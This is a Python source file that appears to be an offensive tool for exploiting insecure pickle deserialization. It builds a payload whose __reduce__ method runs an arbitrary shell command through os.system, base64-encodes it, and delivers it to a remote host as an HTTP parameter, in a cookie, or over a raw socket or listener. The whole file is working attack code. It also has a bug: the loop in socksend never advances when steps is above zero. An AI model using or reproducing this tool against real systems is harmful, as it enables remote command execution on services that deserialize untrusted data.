#imports
import pickle
import base64
import requests
import socket

class utility:
	command=""

	def b64pickle(payload):
		p=getattr(payloads,payload)
		p=base64.b64encode(pickle.dumps(p()))
		return p

class payloads:
	class oscmd:
		def __reduce__(self):
			import os
			return (os.system, (utility.command,))

def updatecmd(newcmd):
	utility.command=newcmd

def webreq(schema,method,rhost,rport,payload,param=None,cook=None):
	methods=["get","post","put","patch"]
	payload=utility.b64pickle(payload)
	if method in methods:
		r=getattr(requests,method)
	if param:
		if method == "get":
			r(f"{schema}://{rhost}:{rport}/?{param}={payload}")
		else:
			data={param:payload}
			r(f"{schema}://{rhost}:{rport}",data=data)
	else:
		cookie={cook:payload.decode("utf-8")}
		r(f"{schema}://{rhost}:{rport}",cookies=cookie)
	return f"firing webreq attack against {schema}://{rhost} "

def socksend(rhost,rport,payload, steps=0):
	rport=int(rport)
	steps=int(steps)
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((rhost,rport))
		i=0
		while i < steps:
			s.sendall("arb".encode("utf-8"))
		s.sendall(utility.b64pickle(payload))
		s.recv(1024)
def socklisten(lport,payload, steps=0):
	lport=int(lport)
	steps=int(steps)
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.bind(("",lport))
		s.listen(1)
		conn, addr = s.accept()
		i=0
		with conn:
			while i < steps:
				conn.sendall("arb".encode("utf-8"))
				i+=1
			conn.sendall(utility.b64pickle(payload))
			conn.recv(1024)

